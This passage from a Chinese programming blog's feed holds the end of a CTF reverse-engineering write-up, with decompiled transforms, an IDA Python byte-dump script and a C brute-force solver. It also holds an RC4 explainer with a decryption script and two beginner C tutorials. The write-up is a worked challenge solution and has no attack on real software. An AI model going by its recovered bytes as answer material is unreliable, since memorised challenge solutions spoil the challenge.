alt="image-20230928143211657"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f0\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f1\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f2\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f3\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f4\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候就只剩下提取出v9对应的数组(IDA分析将其错误分析成一个__int128,三个int和一个char的组合了)中的加密后的flag了,我们动态调试,然后用<code>IDA Python</code>提取29个字节,这里多提取了几次,最后提取出来的没有<code>0x0</code>的才是正确的(虽然我不知道怎么回事).</p><p>貌似要在正式开始和v9比较时数据才写回内存(?)总之把断点位置从22行<code>if ( strlen(Arglist) == 29 )</code>放到后面27行的<code>while ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</code>才最后成功.</p><p>这也意味着我们动调是需要输入正确的长为29的字符串,我们已经生成好了.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143705669.png" alt="image-20230928143705669" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143717471.png" alt="image-20230928143717471" style="zoom:50%;" /><p>我们双击v9,找到其地址,写脚本导出即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143825128.png" alt="image-20230928143825128"></p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adr=<span class="number">0x0036FD68</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    temp=get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(temp,byteorder=<span class="string">&#x27;little&#x27;</span>)),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最后把提取出来的数据进行爆破解密即可:</p><p>爆破脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> str1[] = &#123;</span><br><span class="line"><span class="number">0x7f</span>, <span class="number">0x7e</span>, <span class="number">0x51</span>, <span class="number">0xce</span>, <span class="number">0xfb</span>, <span class="number">0x4e</span>, <span class="number">0x7a</span>, <span class="number">0x24</span>, <span class="number">0xe8</span>, <span class="number">0xdf</span>, <span class="number">0x59</span>, <span class="number">0x71</span>, <span class="number">0x26</span>, <span class="number">0xca</span>, <span class="number">0xe1</span>, <span class="number">0x6c</span>, <span class="number">0x86</span>, <span class="number">0x21</span>, <span class="number">0xcc</span>, <span class="number">0xf5</span>, <span class="number">0x28</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0xd8</span>, <span class="number">0xef</span>, <span class="number">0x6e</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0xfa</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// printf(&quot;%d&quot;,sizeof(str1) / sizeof(str1[0]));</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">32</span>; c &lt;= <span class="number">126</span>; ++c) &#123;</span><br><span class="line"><span class="keyword">if</span> (func_p[i % <span class="number">5</span>](c) == str1[i]) &#123;</span><br><span class="line"><span class="built_in">putchar</span>(c);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">adr=0x00EFFA1C</span></span><br><span class="line"><span class="comment">for i in range(29):</span></span><br><span class="line"><span class="comment">    temp=get_bytes(adr+i,1)</span></span><br><span class="line"><span class="comment">    print(hex(int.from_bytes(temp,byteorder=&#x27;little&#x27;)),end=&#x27;,&#x27;)</span></span><br><span class="line"><span class="comment">    #print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最终结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928144001030.png" alt="image-20230928144001030" style="zoom:50%;" /><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4</title>
      <link href="/2023-09-23-fb5e5b37b475/"/>
      <url>/2023-09-23-fb5e5b37b475/</url>
      
        <content type="html"><![CDATA[<h1 id="RC4概述"><a href="#RC4概述" class="headerlink" title="RC4概述"></a>RC4概述</h1><p>以下为维基百科的描述:</p><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自Rivest Cipher 4的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E4%B8%B2%E6%B5%81%E5%8A%A0%E5%AF%86%E6%B3%95">串流加密法</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此也属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。RC4是<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a>（WEP）中采用的加密算法，也曾经是<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a>可采用的算法之一。</p><p>RC4是由美国密码学家<a href="https://zh.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7%E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9">罗纳德·李维斯特</a>（Ronald Rivest）在1987年设计的。由于RC4算法存在弱点，2015年2月所发布的 <a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> 规定禁止在TLS中使用RC4加密算法[<a href="https://zh.wikipedia.org/wiki/RC4#cite_note-1">1]</a>。</p><p>RC4由<a href="https://zh.wikipedia.org/wiki/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0">伪随机数</a>生成器和<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或</a>运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个<a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">S盒</a>。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于<a href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或运算</a>的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E5%90%88">对合性</a>，RC4加密解密使用同一套算法。</p><h1 id="运算过程"><a href="#运算过程" class="headerlink" title="运算过程"></a>运算过程</h1><p>原理很简单，包括初始化算法（KSA）和<a href="https://baike.baidu.com/item/%E4%BC%AA%E9%9A%8F%E6%9C%BA?fromModule=lemma_inlink">伪随机</a>子密码生成算法（PRGA)两大部分</p><p>由于是异或运算,加解密<code>同操作</code>—对明文使用同一个密钥异或两次最后得到的是原文</p><h1 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;\0&#x27;</span>  <span class="comment"># enc 中保存密文</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsFlagggg&quot;</span>  <span class="comment"># 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成(搅乱) S-box --- KSA</span></span><br><span class="line">s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用S盒生成密钥流 --- The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"># 同时直接进行解密</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">    k = s_box[t]</span><br><span class="line">    res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-4-顺序语句和语句</title>
      <link href="/2023-09-22-4ec96a183bec/"/>
      <url>/2023-09-22-4ec96a183bec/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是顺序执行"><a href="#什么是顺序执行" class="headerlink" title="什么是顺序执行"></a>什么是顺序执行</h1><p>顺序执行很简单,就是一步一步的向下运行,不管你写了什么代码,永远都是从开始的地方自上而下一步一步的执行到结束,除非中途有执行顺序改变的代码(选择语句,循环语句,goto跳转等)</p><p>任何语言都有这3种执行顺序的支持(不同程度上),C语言也不例外,而对于顺序执行,没有任何特殊的辅助标识来提示,单纯的向下依次运行即可.</p><p>例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第一条语句\n&quot;</span>); <span class="comment">// printf用来输出一个字符串,这里只需要知道用来输出即可</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第二条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第三条语句\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这是第四条语句\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果很显而易见:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922191707205.png" alt="image-20230922191707205" style="zoom:33%;" /><p>另一个算数的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num); <span class="comment">//同样,只需要知道是用来输出num的值即可</span></span><br><span class="line">num = num + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">num = num + <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922192123052.png" alt="image-20230922192123052" style="zoom:33%;" /><p>实际上顺序执行几乎完全不需要考虑任何问题,你只需要按照你的想法去考虑这个程序一步步地要依次做什么事情,然后去一行行的写代码即可.</p><h1 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h1><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><h3 id="什么是语句"><a href="#什么是语句" class="headerlink" title="什么是语句"></a>什么是语句</h3><p>以下根据<code>cppreference</code>的相关定义进行讲解.</p><p>c语言中,程序的基本单位是函数,而在每一个函数中(或者说一个过程),每一步运行的都是语句.</p><p>换句话说,<code>语句是带顺序执行的 C 程序段。任何函数体都是一条复合语句，继而为语句或声明的序列</code>,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="comment">// 复合语句的开始</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明（非语句）</span></span><br><span class="line">    n = n+<span class="number">1</span>; <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n = %d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回语句</span></span><br><span class="line">&#125; <span class="comment">// 复合语句之结尾，函数体之结尾</span></span><br></pre></td></tr></table></figure><h3 id="语句的分类"><a href="#语句的分类" class="headerlink" title="语句的分类"></a>语句的分类</h3><p>首先必须要说明的一点是,下面的概念是相对严谨的描述(我根据cppreference进行描述),如果不理解不要紧,后面会进行穿插讲解,其实重要一点的就是要知道什么地方需要加<code>;</code>什么地方不需要加.</p><p>语句有五种类型：</p><ol><li><p>复合语句 </p><p> 或称块语句,由一对{}括起来,是花括号所包围的语句与声明的序列.</p><p> 复合语句允许将一组声明和语句组合入一个单元，并将其在任何期待单个语句的场所使用(例如在 <a href="https://zh.cppreference.com/w/c/language/if">if</a> 语句或循环语句中)—换句话说,一个复合语句中的所有语句将被视为一个整体的大语句进行使用.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expr) <span class="comment">// if 语句的开始</span></span><br><span class="line">&#123; <span class="comment">// 开始块</span></span><br><span class="line">  <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">&#125; <span class="comment">// 块结尾， if 语句结尾</span></span><br></pre></td></tr></table></figure><p> 此外,一个复合语句内,会引入其自身的块作用域,此时块内部的变量将屏蔽外部同名的变量,有关<code>作用域</code>的知识将在后面进行讲解.</p></li><li><p>表达式语句</p><p>  <strong>关于表达式的概念,会在后面进行讲解.</strong></p><p>  跟随分号的表达式是一条语句.</p><p>  无表达式的语句叫做<code>空语句</code>,空语句很重要,在后面讲解循环时会使用到.</p><p>  典型的 C 程序中大多数语句是表达式语句，例如<code>赋值</code>或<code>函数调用</code>—例如前面说过的printf()的函数调用表达式.</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>); <span class="comment">// 表达式语句</span></span><br><span class="line"><span class="type">char</span> *s;</span><br><span class="line"><span class="keyword">while</span> (*s++ != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    ; <span class="comment">// 空语句</span></span><br></pre></td></tr></table></figure></li><li><p>选择语句</p><p>  选择语句根据表达式的值，选择数条语句之一执行—后面会讲解到的选择执行.</p></li><li><p>循环语句</p><p>  循环语句重复执行一条语句,注意,这里将复合语句视为一条语句!</p><p>  后面会讲解到的循环执行.</p></li><li><p>跳转语句</p><p>  跳转语句无条件地转移控制流.</p><p>  这里其实算是C保留了一点汇编的影子,C允许使用goto进行跳转.</p><p>  跳转语句也有几种:</p><ol><li><a href="https://zh.cppreference.com/w/c/language/break">break</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/continue">continue</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/return">return</a> 语句带可选的表达式</li><li><a href="https://zh.cppreference.com/w/c/language/goto">goto</a> 语句</li></ol><p>  这些语句将在后面讲解其他执行顺序时进行讲解,放在顺序执行里为时过早.</p></li></ol><p>​—WAHAHA,2023.9.22</p><p>上一篇:<a href="../2023-09-20-c8dccef8fb72/">c语言教程-3-数据类型</a></p><p>下一篇:<a href="../2023-09-23-a68b2441a427/">c语言教程-5-表达式</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-3-数据类型</title>
      <link href="/2023-09-20-c8dccef8fb72/"/>
      <url>/2023-09-20-c8dccef8fb72/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要有数据类型"><a href="#为什么要有数据类型" class="headerlink" title="为什么要有数据类型"></a>为什么要有数据类型</h1><p>​如果你能想到这个问题,那么恭喜你意识到了低级语言和高级语言的区别.机器语言自然不必多说,到了汇编语言,仍然没有发展出数据类型这个概念–一切都是按照二进制串逐字节进行处理的.也就是说,在汇编语言的角度,无论这个数据是什么(无论是小数,整数,还是字符串),统统视为二进制串,程序员需要自己去识别考虑自己现在正在处理什么数据,去编写对应的处理代码.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">; 8086汇编</span><br><span class="line">; 定义两个数据段,我们只能将其视为一个个的字节(或字)去进行处理,没有其他的类型可以识别,</span><br><span class="line">; 各个数据段的意义及操作全凭程序员自己处理</span><br><span class="line">assume cs:code</span><br><span class="line">data1 segment</span><br><span class="line">    db 1,2,3,4,5           </span><br><span class="line">data1 ends</span><br><span class="line">data2 segment</span><br><span class="line">    db 6,7,8,9,10</span><br><span class="line">data2 ends</span><br></pre></td></tr></table></figure><p>​很容易就能想到这样的开发方式的困难与繁琐.那么随后出现的高级语言,不仅在语法上接近自然语言,在对数据存储的角度,也考虑的十分周到,C语言中出现了(并不是第一个)基本数据类型,用以识别不同类型的数据,从而在底层进行不同的处理—例如浮点数和整数的底层存储原理完全不同,但是它们都共享同一个加法运算符<code>+</code>进行加法运算.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 整数和浮点数都直接使用+运算符</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> integerNum = <span class="number">5</span>,integerNum2 = <span class="number">6</span>;</span><br><span class="line">    <span class="type">float</span> floatNum = <span class="number">2.5</span>,floatNum2 = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i_result = integerNum + integerNum2;</span><br><span class="line"><span class="type">float</span> f_result =  floatNum + floatNum2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整数和:%d\n&quot;</span>, i_result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数和:%f\n&quot;</span>, f_result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​也就是说,数据类型方便了我们在编程的时候进行不同数据的区分,而且编译器也能根据数据类型的不同从而进行一定程度的代码检查,从而避免错误的数据处理—然而这种检查是有限的,因为C语言相对还是比较宽松的,一些隐式转换(后面介绍,例如将int类型的值自动提升为float单精度浮点型)C语言是默认允许的.</p><p>​C语言给了C开发者最大限度的自由度,C语言认为避免这些潜在的错误是程序员的事情,而不是为了安全进行限制.越学到后面,尤其是学习了其他高级语言,就越能体会到C语言那极高的自由度,同时,这也给C程序带来了不小的安全问题,例如安全竞赛的PWN方向的很多部分的关键都是利用了C函数的栈溢出漏洞进行攻击.所以,在编写C程序的时候,更应该比其他语言编写者加倍小心,因为C编译器可能并不会给你足够多的报错信息让你进行纠正—同样,越是学的多,越能体会得到这个问题.</p><h1 id="C语言支持的数据类型"><a href="#C语言支持的数据类型" class="headerlink" title="C语言支持的数据类型"></a>C语言支持的数据类型</h1><p>C语言支持的数据类型有如下几种:</p><p>​<code>4种数据类型----整型(整数),浮点型(小数),字符型(字符),特殊(数组,结构体,指针,枚举,联合)</code></p><p>不同的数据类型用来存储不同类型的值,并且彼此之间可以进行一定程度上的转换.</p><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>作为数据类型,都有不同的存储范围</p><p>​我们知道有1字节&#x3D;8位(二进制位)</p><p>​整型的各种数据范围都是2的幂次方,根据编写的程序所要处理的问题规模的不同,我们可以选择合适的类型.</p><p>那么对于整型的所有可选的类型有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">short</span> 短整型 <span class="number">2</span>字节/<span class="number">16</span>位 <span class="number">-2</span>^<span class="number">15</span>~<span class="number">2</span>^<span class="number">15</span><span class="number">-1</span></span><br><span class="line"><span class="type">signed</span> <span class="type">int</span> 整型 <span class="number">4</span>字节/<span class="number">32</span>位 <span 